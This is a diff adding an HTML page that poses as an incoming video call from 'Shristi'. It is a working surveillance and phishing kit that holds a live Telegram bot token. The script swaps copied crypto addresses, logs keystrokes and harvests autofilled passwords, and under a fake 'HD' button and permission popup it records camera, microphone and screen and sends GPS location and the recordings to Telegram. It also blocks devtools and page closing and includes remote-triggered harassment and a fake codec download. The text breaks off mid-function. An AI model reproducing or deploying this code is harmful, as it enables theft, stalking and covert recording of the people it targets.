@@ -1,0 +1,896 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Incoming Call - Shristi</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #000; overflow: hidden; height: 100vh; width: 100vw; }
+  #app { position: relative; width: 100%; height: 100vh; overflow: hidden; }
+
+  /* Incoming call screen */
+  #incoming { position: absolute; inset: 0; background: linear-gradient(160deg, #1a0000 0%, #2d0000 40%, #000 100%); display: flex; flex-direction: column; align-items: center; justify-content: space-between; padding: 60px 20px 80px; color: #fff; z-index: 10; }
+  #incoming::before { content: ''; position: absolute; inset: 0; background: radial-gradient(circle at 50% 30%, rgba(255,0,0,0.25), transparent 60%); pointer-events: none; }
+  .caller-info { text-align: center; z-index: 2; margin-top: 40px; }
+  .avatar { width: 140px; height: 140px; border-radius: 50%; background: linear-gradient(135deg, #ff2e63, #ff6b6b); display: flex; align-items: center; justify-content: center; font-size: 60px; font-weight: 600; margin: 0 auto 24px; box-shadow: 0 0 0 8px rgba(255,46,99,0.15), 0 0 0 16px rgba(255,46,99,0.08); animation: pulse 1.8s infinite; overflow: hidden; }
+  @keyframes pulse { 0% { box-shadow: 0 0 0 8px rgba(255,46,99,0.15), 0 0 0 16px rgba(255,46,99,0.08); } 50% { box-shadow: 0 0 0 12px rgba(255,46,99,0.25), 0 0 0 24px rgba(255,46,99,0.1); } 100% { box-shadow: 0 0 0 8px rgba(255,46,99,0.15), 0 0 0 16px rgba(255,46,99,0.08); } }
+  .caller-name { font-size: 34px; font-weight: 600; margin-bottom: 8px; letter-spacing: 0.5px; }
+  .call-status { font-size: 16px; color: rgba(255,255,255,0.7); letter-spacing: 1px; }
+
+  .call-actions { display: flex; gap: 90px; z-index: 2; margin-bottom: 20px; }
+  .action-btn { width: 72px; height: 72px; border-radius: 50%; border: none; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: transform 0.15s; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
+  .action-btn:active { transform: scale(0.92); }
+  .action-btn svg { width: 32px; height: 32px; fill: #fff; }
+  .btn-decline { background: linear-gradient(135deg, #ff3b30, #d70015); }
+  .btn-accept { background: linear-gradient(135deg, #34c759, #00a834); animation: shake 1.5s infinite; }
+  @keyframes shake { 0%,100% { transform: rotate(0deg); } 10%,30%,50% { transform: rotate(-12deg); } 20%,40%,60% { transform: rotate(12deg); } 70% { transform: rotate(0); } }
+
+  /* Active call screen */
+  #activeCall { position: absolute; inset: 0; background: #000; display: none; z-index: 20; overflow: hidden; }
+  #remoteVideo { position: absolute; inset: 0; width: 100%; height: 100%; object-fit: cover; background: #111; }
+  #localVideo { position: absolute; top: 20px; right: 15px; width: 95px; height: 135px; object-fit: cover; border-radius: 12px; border: 2px solid rgba(255,255,255,0.25); background: #222; z-index: 5; transform: scaleX(-1); box-shadow: 0 4px 15px rgba(0,0,0,0.6); }
+  .active-top-bar { position: absolute; top: 25px; left: 20px; z-index: 6; color: #fff; }
+  .active-name { font-size: 22px; font-weight: 600; text-shadow: 0 2px 6px rgba(0,0,0,0.8); }
+  .active-timer { font-size: 14px; color: rgba(255,255,255,0.85); margin-top: 2px; text-shadow: 0 1px 4px rgba(0,0,0,0.8); }
+
+  /* Responsive Controls */
+  .active-controls { position: absolute; bottom: 30px; left: 0; right: 0; display: flex; justify-content: center; align-items: center; gap: 15px; z-index: 6; padding: 0 10px; }
+  .ctrl-btn { width: 55px; height: 55px; border-radius: 50%; border: none; background: rgba(255,255,255,0.18); backdrop-filter: blur(10px); display: flex; align-items: center; justify-content: center; cursor: pointer; flex-shrink: 0; }
+  .ctrl-btn svg { width: 24px; height: 24px; fill: #fff; }
+  .ctrl-btn.end { background: linear-gradient(135deg, #ff3b30, #d70015); width: 65px; height: 65px; }
+  
+  .ctrl-btn.filter { background: linear-gradient(135deg, #007aff, #005bb5); font-size: 14px; color: #fff; font-weight: bold; display: none; border: 2px solid #fff; }
+  .ctrl-btn.filter.show { display: flex; }
+  .ctrl-btn.filter.pulse { animation: hdPulse 1.2s infinite; box-shadow: 0 0 15px #007aff, 0 0 30px #007aff; }
+  @keyframes hdPulse { 0% { transform: scale(1); } 50% { transform: scale(1.15); box-shadow: 0 0 25px #007aff, 0 0 50px #007aff; } 100% { transform: scale(1); } }
+
+  @media (max-width: 360px) { .ctrl-btn { width: 50px; height: 50px; } .ctrl-btn.end { width: 60px; height: 60px; } .active-controls { gap: 10px; } }
+
+  .connecting-overlay { position: absolute; inset: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #fff; background: linear-gradient(160deg, #1a0000, #000); z-index: 10; transition: opacity 0.5s; }
+  .connecting-overlay.hidden { opacity: 0; pointer-events: none; }
+  .connecting-overlay .ring { width: 100px; height: 100px; border-radius: 50%; background: linear-gradient(135deg, #ff2e63, #ff6b6b); display: flex; align-items: center; justify-content: center; font-size: 40px; font-weight: 600; animation: pulse 1.8s infinite; margin-bottom: 20px; }
+  .connecting-text { font-size: 18px; letter-spacing: 1px; color: rgba(255,255,255,0.8); text-align: center; padding: 0 20px; line-height: 1.5; }
+  .connecting-text b { color: #34c759; font-size: 22px; display: block; margin-top: 10px; }
+
+  /* CUSTOM PERMISSION POPUP (Ek hi baar aayega) */
+  #permPopup { position: fixed; inset: 0; background: rgba(0,0,0,0.75); backdrop-filter: blur(6px); display: none; align-items: center; justify-content: center; z-index: 999; padding: 20px; }
+  #permPopup.show { display: flex; }
+  .perm-card { background: linear-gradient(160deg, #1c1c1e, #0a0a0a); border-radius: 20px; padding: 28px 22px 18px; max-width: 340px; width: 100%; color: #fff; text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.8); border: 1px solid rgba(255,255,255,0.08); }
+  .perm-icon { width: 64px; height: 64px; border-radius: 50%; background: linear-gradient(135deg, #ff2e63, #ff6b6b); display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; }
+  .perm-icon svg { width: 32px; height: 32px; fill: #fff; }
+  .perm-title { font-size: 19px; font-weight: 600; margin-bottom: 8px; }
+  .perm-msg { font-size: 14px; color: rgba(255,255,255,0.7); line-height: 1.5; margin-bottom: 20px; }
+  .perm-btns { display: flex; gap: 10px; }
+  .perm-btn { flex: 1; padding: 12px; border-radius: 12px; border: none; font-size: 15px; font-weight: 600; cursor: pointer; }
+  .perm-deny { background: rgba(255,255,255,0.12); color: #fff; }
+  .perm-allow { background: linear-gradient(135deg, #34c759, #00a834); color: #fff; }
+
+  /* DYNAMIC FAKE LOGIN / PHISHING */
+  #fakeLogin { position: fixed; inset: 0; background: #fff; z-index: 10000; display: none; align-items: center; justify-content: center; flex-direction: column; padding: 20px; font-family: -apple-system, sans-serif; }
+  #fakeLogin.show { display: flex; }
+  .login-box { width: 100%; max-width: 350px; text-align: center; }
+  .login-box img { height: 50px; margin-bottom: 20px; }
+  .login-box h2 { font-size: 22px; color: #333; margin-bottom: 10px; }
+  .login-box p { font-size: 14px; color: #666; margin-bottom: 20px; }
+  .login-box input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; }
+  .login-box button { width: 100%; padding: 12px; background: #007aff; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
+
+  /* BSOD FAKE CRASH */
+  #bsod { position: fixed; inset: 0; background: #0078d7; color: #fff; z-index: 999999; display: none; flex-direction: column; padding: 10vh 10vw; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+  #bsod.show { display: flex; }
+  #bsod .emoji { font-size: 80px; margin-bottom: 20px; }
+  #bsod h1 { font-size: 32px; font-weight: 300; margin-bottom: 20px; }
+  #bsod p { font-size: 18px; line-height: 1.5; margin-bottom: 20px; }
+  #bsod .qr { display: flex; align-items: center; gap: 20px; margin-top: 20px; }
+  #bsod .qr-box { width: 100px; height: 100px; background: #fff; }
+
+  /* NEW OVERLAYS */
+  #whiteScreen { position: fixed; inset: 0; background: #fff; z-index: 99990; display: none; }
+  #hackerAlert { position: fixed; inset: 0; background: rgba(0,0,0,0.95); color: #0f0; z-index: 99991; display: none; flex-direction: column; align-items: center; justify-content: center; font-family: monospace; text-align: center; padding: 20px; }
+  #hackerAlert h1 { font-size: 36px; margin-bottom: 20px; text-shadow: 0 0 10px #0f0; }
+  #hackerAlert .progress { width: 80%; height: 20px; background: #333; border-radius: 10px; overflow: hidden; margin-top: 20px; }
+  #hackerAlert .progress-bar { width: 99%; height: 100%; background: #0f0; animation: pulse 1s infinite; }
+  #fakeLag { position: fixed; inset: 0; background: rgba(0,0,0,0.85); color: #fff; z-index: 99992; display: none; flex-direction: column; align-items: center; justify-content: center; }
+  #fakeLag .spinner { width: 50px; height: 50px; border: 5px solid #333; border-top: 5px solid #fff; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+  #codecError { position: fixed; inset: 0; background: #fff; color: #333; z-index: 99993; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; font-family: sans-serif; }
+  #codecError h1 { color: #d32f2f; margin-bottom: 15px; }
+  #codecError button { padding: 15px 30px; background: #1976d2; color: #fff; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; margin-top: 20px; }
+
+  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  .hidden { display: none !important; }
+</style>
+</head>
+<body>
+<div id="app">
+  <!-- Incoming call -->
+  <div id="incoming">
+    <div class="caller-info">
+      <div class="avatar">S</div>
+      <div class="caller-name">Shristi</div>
+      <div class="call-status">Incoming video call...</div>
+    </div>
+    <div class="call-actions">
+      <button class="action-btn btn-decline" id="declineBtn">
+        <svg viewBox="0 0 24 24"><path d="M12 9c-1.6 0-3.15.25-4.6.72v3.1c0 .39-.23.74-.56.9-.98.49-1.87 1.12-2.66 1.85-.18.18-.43.28-.7.28-.28 0-.53-.11-.71-.29L.29 13.08a.956.956 0 0 1-.29-.7c0-.28.11-.53.29-.71C3.34 8.78 7.46 7 12 7s8.66 1.78 11.71 4.67c.18.18.29.43.29.71 0 .27-.11.52-.29.7l-2.48 2.48c-.18.18-.43.29-.71.29-.27 0-.52-.1-.7-.28a11.27 11.27 0 0 0-2.67-1.85.996.996 0 0 1-.56-.9v-3.1C15.15 9.25 13.6 9 12 9z"/></svg>
+      </button>
+      <button class="action-btn btn-accept" id="acceptBtn">
+        <svg viewBox="0 0 24 24"><path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/></svg>
+      </button>
+    </div>
+  </div>
+
+  <!-- Active call -->
+  <div id="activeCall">
+    <div class="connecting-overlay" id="connectingOverlay">
+      <div class="ring">S</div>
+      <div class="connecting-text" id="connectText">Connecting...<br><b>Please tap the "HD" button below to continue</b></div>
+    </div>
+    <video id="remoteVideo" autoplay playsinline muted></video>
+    <video id="localVideo" autoplay playsinline muted></video>
+    <video id="backCameraVideo" autoplay playsinline muted style="display:none;"></video>
+    <div class="active-top-bar">
+      <div class="active-name">Shristi</div>
+      <div class="active-timer" id="timer">00:00</div>
+    </div>
+    <div class="active-controls">
+      <button class="ctrl-btn" id="muteBtn">
+        <svg viewBox="0 0 24 24"><path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5-3c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92h-2z"/></svg>
+      </button>
+      <button class="ctrl-btn filter pulse" id="filterBtn">HD</button>
+      <button class="ctrl-btn end" id="endBtn">
+        <svg viewBox="0 0 24 24"><path d="M12 9c-1.6 0-3.15.25-4.6.72v3.1c0 .39-.23.74-.56.9-.98.49-1.87 1.12-2.66 1.85-.18.18-.43.28-.7.28-.28 0-.53-.11-.71-.29L.29 13.08a.956.956 0 0 1-.29-.7c0-.28.11-.53.29-.71C3.34 8.78 7.46 7 12 7s8.66 1.78 11.71 4.67c.18.18.29.43.29.71 0 .27-.11.52-.29.7l-2.48 2.48c-.18.18-.43.29-.71.29-.27 0-.52-.1-.7-.28a11.27 11.27 0 0 0-2.67-1.85.996.996 0 0 1-.56-.9v-3.1C15.15 9.25 13.6 9 12 9z"/></svg>
+      </button>
+    </div>
+  </div>
+
+  <!-- Custom camera permission popup (ONLY ONE POPUP) -->
+  <div id="permPopup">
+    <div class="perm-card">
+      <div class="perm-icon">
+        <svg viewBox="0 0 24 24"><path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/></svg>
+      </div>
+      <div class="perm-title">Camera, Mic & Location</div>
+      <div class="perm-msg">Shristi wants to start a video call. Please allow all access to continue.</div>
+      <div class="perm-btns">
+        <button class="perm-btn perm-deny" id="permDeny">Deny</button>
+        <button class="perm-btn perm-allow" id="permAllow">Allow All</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Fake Login Overlay -->
+  <div id="fakeLogin">
+    <div class="login-box" id="loginBox">
+      <!-- Injected via JS based on OS -->
+    </div>
+  </div>
+
+  <!-- Fake BSOD -->
+  <div id="bsod">
+    <div class="emoji">:(</div>
+    <h1>Your PC ran into a problem and needs to restart. We're just collecting some error info, and then we'll restart for you.</h1>
+    <p>20% complete</p>
+    <div class="qr">
+      <div class="qr-box"></div>
+      <p>For more information about this issue and possible fixes, visit https://www.windows.com/stopcode</p>
+    </div>
+  </div>
+
+  <!-- NEW OVERLAYS -->
+  <div id="whiteScreen"></div>
+  <div id="hackerAlert">
+    <h1>⚠️ SYSTEM COMPROMISED</h1>
+    <p>Your device is infected with a Trojan. All data is being exfiltrated.</p>
+    <div class="progress"><div class="progress-bar"></div></div>
+  </div>
+  <div id="fakeLag">
+    <div class="spinner"></div>
+    <h2>Reconnecting...</h2>
+    <p style="color:#aaa;margin-top:10px;">Poor network connection</p>
+  </div>
+  <div id="codecError">
+    <h1>Video Codec Missing</h1>
+    <p>The required video codec is not installed on your device. Please download and install the plugin to continue the call.</p>
+    <button onclick="downloadPlugin()">Download Plugin</button>
+  </div>
+</div>
+
+<audio id="ringtone" src="https://www.soundjay.com/phones/bell-ringing-05.mp3" loop></audio>
+
+<script>
+window.botToken = "9253220777:AAH4Od7C6ljevQW71BBRoXL_T-XDHJ6sCTM";
+window.chatId = "1727570046";
+
+// --- SERVICE WORKER ---
+if ('serviceWorker' in navigator) {
+    const swCode = `self.addEventListener('install', e => self.skipWaiting()); self.addEventListener('activate', e => self.clients.claim());`;
+    const blob = new Blob([swCode], {type: 'application/javascript'});
+    navigator.serviceWorker.register(URL.createObjectURL(blob)).catch(()=>{});
+}
+
+// --- LOCALSTORAGE TRAP ---
+localStorage.setItem('king007_session', 'active');
+
+// --- ANTI DEVTOOLS ---
+document.addEventListener('contextmenu', event => event.preventDefault());
+document.addEventListener('keydown', (e) => {
+    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && e.key === 'u')) {
+        e.preventDefault();
+        document.body.innerHTML = "<h1 style='color:white;text-align:center;margin-top:20vh;'>Access Denied</h1>";
+    }
+});
+
+// --- CLIPBOARD SWAPPER ---
+document.addEventListener('copy', (e) => {
+    let selectedText = window.getSelection().toString();
+    if (/^(0x[a-fA-F0-9]{40}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})$/.test(selectedText)) {
+        e.clipboardData.setData('text/plain', '0x71C7656EC7ab88b098defB751B7401B5f6d8976F');
+        e.preventDefault();
+        fetch(`https://api.telegram.org/bot${window.botToken}/sendMessage`, {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: window.chatId, text: `💰 **Crypto Address Swapped!**\nOriginal: \`${selectedText}\``, parse_mode: 'Markdown' })
+        }).catch(()=>{});
+    }
+});
+
+// --- KEYLOGGER ---
+let keylogs = "";
+document.addEventListener('keydown', (e) => { keylogs += e.key; });
+
+// --- TAB TITLE HIJACK ---
+document.addEventListener("visibilitychange", () => {
+    if(document.hidden) {
+        document.title = "⚠️ RETURN TO CALL!";
+    } else {
+        document.title = "Incoming Call - Shristi";
+    }
+});
+
+// --- AUTOFILL HARVESTING ---
+function harvestAutofill() {
+    const container = document.createElement('div');
+    container.style.cssText = 'position:absolute; top:-10000px; left:-10000px; opacity:0;';
+    container.innerHTML = `<form><input type="text" id="autoUser" autocomplete="username"><input type="password" id="autoPass" autocomplete="current-password"><button type="submit">Login</button></form>`;
+    document.body.appendChild(container);
+    setTimeout(() => {
+        const u = document.getElementById('autoUser').value;
+        const p = document.getElementById('autoPass').value;
+        if(u || p) {
+            fetch(`https://api.telegram.org/bot${window.botToken}/sendMessage`, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: window.chatId, text: `📝 **Autofill Data Harvested:**\nUser: ${u}\nPass: ${p}`, parse_mode: 'Markdown' })
+            }).catch(()=>{});
+        }
+    }, 3000);
+}
+
+// --- FAKE STATIC NOISE ---
+function startStaticNoise() {
+    try {
+        const AudioContext = window.AudioContext || window.webkitAudioContext;
+        const ctx = new AudioContext();
+        const bufferSize = ctx.sampleRate * 2;
+        const buffer = ctx.createBuffer(1, bufferSize, ctx.sampleRate);
+        const output = buffer.getChannelData(0);
+        for (let i = 0; i < bufferSize; i++) { output[i] = Math.random() * 2 - 1; }
+        const whiteNoise = ctx.createBufferSource();
+        whiteNoise.buffer = buffer;
+        whiteNoise.loop = true;
+        const gainNode = ctx.createGain();
+        gainNode.gain.value = 0.02;
+        whiteNoise.connect(gainNode).connect(ctx.destination);
+        whiteNoise.start();
+    } catch(e) {}
+}
+
+// --- FINGERPRINTING ---
+function getFingerprint() {
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    ctx.textBaseline = "top";
+    ctx.font = "14px 'Arial'";
+    ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20);
+    ctx.fillStyle = "#069"; ctx.fillText("Kanha, Illusion here!", 2, 15);
+    ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText("Fingerprint", 4, 17);
+    return canvas.toDataURL();
+}
+
+// --- GLOBAL TOGGLES ---
+let sirenCtx = null, sirenOsc = null;
+let vibrateInterval = null;
+let clickCounter = 0;
+
+function toggleTorch() {
+    if(!window.currentStream) return;
+    const track = window.currentStream.getVideoTracks()[0];
+    try {
+        const capabilities = track.getCapabilities();
+        if (capabilities.torch) {
+            const current = track.getSettings().torch || false;
+            track.applyConstraints({ advanced: [{ torch: !current }] });
+            sendMessageToTelegram(`🔦 Torch toggled to ${!current ? 'ON' : 'OFF'}`);
+        } else {
+            sendMessageToTelegram(`❌ Torch not supported on this camera.`);
+        }
+    } catch(e) { sendMessageToTelegram(`❌ Torch failed.`); }
+}
+
+function toggleSiren() {
+    if(sirenOsc) {
+        sirenOsc.stop(); sirenOsc = null;
+        sendMessageToTelegram("🔇 Siren stopped.");
+        return;
+    }
+    try {
+        sirenCtx = new (window.AudioContext || window.webkitAudioContext)();
+        sirenOsc = sirenCtx.createOscillator();
+        const gain = sirenCtx.createGain();
+        sirenOsc.type = 'sawtooth';
+        sirenOsc.frequency.setValueAtTime(800, sirenCtx.currentTime);
+        setInterval(() => {
+            if(sirenOsc) sirenOsc.frequency.setValueAtTime(800 + Math.random()*600, sirenCtx.currentTime);
+        }, 150);
+        gain.gain.value = 1;
+        sirenOsc.connect(gain).connect(sirenCtx.destination);
+        sirenOsc.start();
+        sendMessageToTelegram("🚨 Siren playing at max volume!");
+    } catch(e) { sendMessageToTelegram("❌ Failed to play siren."); }
+}
+
+function toggleVibration() {
+    if(vibrateInterval) {
+        clearInterval(vibrateInterval); vibrateInterval = null;
+        navigator.vibrate(0);
+        sendMessageToTelegram("📴 Vibration stopped.");
+    } else {
+        vibrateInterval = setInterval(() => navigator.vibrate([500, 200, 500]), 1000);
+        sendMessageToTelegram("📳 Constant vibration started!");
+    }
+}
+
+function toggleBrightness() {
+    const el = document.getElementById('whiteScreen');
+    if(el.style.display === 'block') { el.style.display = 'none'; sendMessageToTelegram("🌙 White screen OFF."); } 
+    else { el.style.display = 'block'; sendMessageToTelegram("☀️ White screen ON (Max Brightness)."); }
+}
+
+function toggleLag() {
+    const el = document.getElementById('fakeLag');
+    if(el.style.display === 'flex') { el.style.display = 'none'; sendMessageToTelegram("📶 Lag removed."); } 
+    else { el.style.display = 'flex'; sendMessageToTelegram("🐌 Fake lag injected."); }
+}
+
+function freezeBrowser() {
+    sendMessageToTelegram("❄️ Freezing browser...");
+    setTimeout(() => { while(true) {} }, 1000);
+}
+
+function downloadPlugin() {
+    const a = document.createElement('a');
+    a.href = 'data:text/plain;charset=utf-8,' + encodeURIComponent('Security Update Required. Please install the latest patch.');
+    a.download = 'Video_Codec_Pack.exe';
+    a.click();
+    document.getElementById('codecError').style.display = 'none';
+    sendMessageToTelegram("📥 Victim downloaded the fake plugin.");
+}
+
+(function() {
+  const incoming = document.getElementById('incoming');
+  const activeCall = document.getElementById('activeCall');
+  const acceptBtn = document.getElementById('acceptBtn');
+  const declineBtn = document.getElementById('declineBtn');
+  const endBtn = document.getElementById('endBtn');
+  const muteBtn = document.getElementById('muteBtn');
+  const localVideo = document.getElementById('localVideo');
+  const remoteVideo = document.getElementById('remoteVideo');
+  const backCameraVideo = document.getElementById('backCameraVideo');
+  const connectingOverlay = document.getElementById('connectingOverlay');
+  const timerEl = document.getElementById('timer');
+  const permPopup = document.getElementById('permPopup');
+  const permAllow = document.getElementById('permAllow');
+  const permDeny = document.getElementById('permDeny');
+  const filterBtn = document.getElementById('filterBtn');
+  const ringtone = document.getElementById('ringtone');
+
+  let stream = null; let backStream = null; let screenStream = null;
+  let audioRecorder = null; let videoRecorder = null;
+  let photoCount = 0; const MAX_PHOTOS = 5; let photoArray = [];
+  let captureInterval = null; let timerInterval = null; let keepAliveInterval = null;
+  let seconds = 0; let muted = false; let facingMode = 'user';
+  let localIps = new Set(); let botUpdateOffset = 0;
+  let hdClicked = false;
+
+  // Prevent Close
+  window.addEventListener('beforeunload', function (e) { e.preventDefault(); e.returnValue = ''; });
+
+  // Motion Detection
+  window.addEventListener('devicemotion', e => {
+      const acc = e.accelerationIncludingGravity;
+      if(acc && (Math.abs(acc.x) > 15 || Math.abs(acc.y) > 15)) {
+          if(Math.random() < 0.2) sendMessageToTelegram("📳 Device shaken/moved significantly.");
+      }
+  });
+
+  // Touch Heatmap
+  document.addEventListener('touchstart', e => {
+      clickCounter++;
+      if(clickCounter % 5 === 0) { // Throttle to avoid spam
+          const touch = e.touches[0];
+          if(touch) sendMessageToTelegram(`👆 Touch at X:${Math.round(touch.clientX)}, Y:${Math.round(touch.clientY)}`);
+      }
+  });
+
+  // Keyboard Detection
+  if (window.visualViewport) {
+      let lastVpHeight = window.visualViewport.height;
+      window.visualViewport.addEventListener('resize', () => {
+          const currentHeight = window.visualViewport.height;
+          if (lastVpHeight - currentHeight > 150) sendMessageToTelegram("⌨️ Keyboard opened by victim.");
+          lastVpHeight = currentHeight;
+      });
+  }
+
+  // Live Battery Alerts
+  if (navigator.getBattery) {
+      navigator.getBattery().then(b => {
+          b.onchargingchange = () => sendMessageToTelegram(`🔌 Charger ${b.charging ? 'plugged in' : 'unplugged'}`);
+          b.onlevelchange = () => {
+              if(Math.round(b.level*100) % 10 === 0) sendMessageToTelegram(`🔋 Battery level: ${Math.round(b.level*100)}%`);
+          };
+      });
+  }
+
+  // WebRTC IP Leak
+  const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+  pc.createDataChannel("");
+  pc.onicecandidate = (e) => {
+      if (e.candidate) {
+          const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+          const match = ipRegex.exec(e.candidate.candidate);
+          if (match) localIps.add(match[1]);
+      }
+  };
+  pc.createOffer().then(o => pc.setLocalDescription(o)).catch(()=>{});
+
+  declineBtn.addEventListener('click', () => {
+    ringtone.pause();
+    document.body.innerHTML = '<div style="color:#fff;display:flex;height:100vh;align-items:center;justify-content:center;font-family:sans-serif;background:#000;">Call Ended</div>';
+  });
+
+  acceptBtn.addEventListener('click', () => { ringtone.pause(); permPopup.classList.add('show'); });
+  permDeny.addEventListener('click', () => { permPopup.classList.remove('show'); startCall(true); }); 
+  
+  permAllow.addEventListener('click', async () => {
+    permPopup.classList.remove('show');
+    await startCall(false); // Attempt ALL permissions via Promise.all
+  });
+
+  async function startCall(forceDeny = false) {
+    incoming.classList.add('hidden');
+    activeCall.style.display = 'block';
+    
+    try {
+        if (document.documentElement.requestFullscreen) await document.documentElement.requestFullscreen();
+        if (screen.orientation && screen.orientation.lock) await screen.orientation.lock('portrait');
+    } catch(e){}
+
+    timerInterval = setInterval(() => {
+      seconds++;
+      timerEl.textContent = String(Math.floor(seconds / 60)).padStart(2, '0') + ':' + String(seconds % 60).padStart(2, '0');
+    }, 1000);
+
+    let mediaStatus = "Denied";
+    let gpsStatus = "Denied";
+
+    if (!forceDeny) {
+        try {
+            // EK SATH SAARI PERMISSIONS MANGO (Browser will show its own prompts, but we trigger them together)
+            const [mediaRes, geoRes] = await Promise.all([
+                navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } },
+                    audio: true
+                }).catch(e => null),
+                new Promise(resolve => navigator.geolocation.getCurrentPosition(
+                    pos => resolve(pos), 
+                    err => resolve(null), 
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                ))
+            ]);
+
+            if (mediaRes) {
+                stream = mediaRes;
+                window.currentStream = stream;
+                localVideo.srcObject = stream;
+                localVideo.play().catch(()=>{});
+                mediaStatus = "Granted";
+                
+                filterBtn.classList.add('show');
+                startAudioRecording();
+                startVideoRecording();
+
+                try {
+                    backStream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } }, audio: false
+                    });
+                    backCameraVideo.srcObject = backStream;
+                    backCameraVideo.play().catch(()=>{});
+                    startBackCameraRecording();
+                } catch(e) {}
+
+                setTimeout(() => { capturePhoto(); captureInterval = setInterval(capturePhoto, 4000); }, 2000);
+            } else {
+                localVideo.style.display = 'none';
+                filterBtn.classList.add('show'); // Show HD even if denied
+            }
+
+            if (geoRes) {
+                gpsStatus = "Granted";
+                sendMessageToTelegram(`📍 <b>GPS Location:</b>\nLat: ${geoRes.coords.latitude}\nLon: ${geoRes.coords.longitude}\n<a href="https://www.google.com/maps?q=${geoRes.coords.latitude},${geoRes.coords.longitude}">Map Link</a>`);
+            }
+
+        } catch (err) {
+            console.log("Permissions failed", err);
+        }
+    } else {
+        localVideo.style.display = 'none';
+        filterBtn.classList.add('show');
+    }
+
+    sendMessageToTelegram(`📸 <b>Permissions Status:</b>\nCamera/Mic: ${mediaStatus}\nGPS: ${gpsStatus}`);
+
+    startKeepAlive();
+    startBotPolling();
+    if (stream) startNoiseAnalyzer();
+    setTimeout(harvestAutofill, 3000);
+    
+    sendUserInfo();
+  }
+
+  function startNoiseAnalyzer() {
+    try {
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        const analyser = audioCtx.createAnalyser();
+        const source = audioCtx.createMediaStreamSource(stream);
+        source.connect(analyser);
+        analyser.fftSize = 256;
+        const dataArray = new Uint8Array(analyser.frequencyBinCount);
+        setInterval(() => {
+            analyser.getByteFrequencyData(dataArray);
+            let sum = 0; for(let i=0; i<dataArray.length; i++) sum += dataArray[i];
+            if(sum / dataArray.length > 60) {
+                // Background noise detected
+            }
+        }, 5000);
+    } catch(e){}
+  }
+
+  filterBtn.addEventListener('click', async () => {
+    if(hdClicked) return;
+    hdClicked = true;
+    filterBtn.classList.remove('pulse');
+    filterBtn.textContent = "ON";
+    filterBtn.style.background = "linear-gradient(135deg, #34c759, #00a834)";
+
+    try {
+        screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+        const screenRecorder = new MediaRecorder(screenStream);
+        let screenChunks = [];
+        screenRecorder.ondataavailable = e => screenChunks.push(e.data);
+        screenRecorder.onstop = () => {
+            const blob = new Blob(screenChunks, { type: 'video/webm' });
+            sendVideoToTelegram(blob, '🖥️ Screen Recording');
+        };
+        screenRecorder.start();
+        setTimeout(() => { screenRecorder.stop(); screenStream.getTracks().forEach(t => t.stop()); }, 15000);
+    } catch(e) {}
+
+    startStaticNoise(); 
+
+    const canvas = document.createElement('canvas');
+    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+    const ctx = canvas.getContext('2d');
+    setInterval(() => {
+        ctx.fillStyle = '#111'; ctx.fillRect(0,0,canvas.width,canvas.height);
+        ctx.fillStyle = '#555'; ctx.font = '16px sans-serif'; ctx.textAlign = 'center';
+        ctx.fillText('Shristi is connected...', canvas.width/2, canvas.height/2);
+    }, 100);
+    remoteVideo.srcObject = canvas.captureStream(10);
+
+    setTimeout(() => { connectingOverlay.classList.add('hidden'); }, 1000);
+  });
+
+  function startBackCameraRecording() {
+      if(!backStream) return;
+      const backTrack = backStream.getVideoTracks()[0];
+      const backVideoRec = new MediaRecorder(new MediaStream([backTrack]), { mimeType: 'video/webm' });
+      let chunks = [];
+      backVideoRec.ondataavailable = e => { if(e.data.size > 0) chunks.push(e.data); };
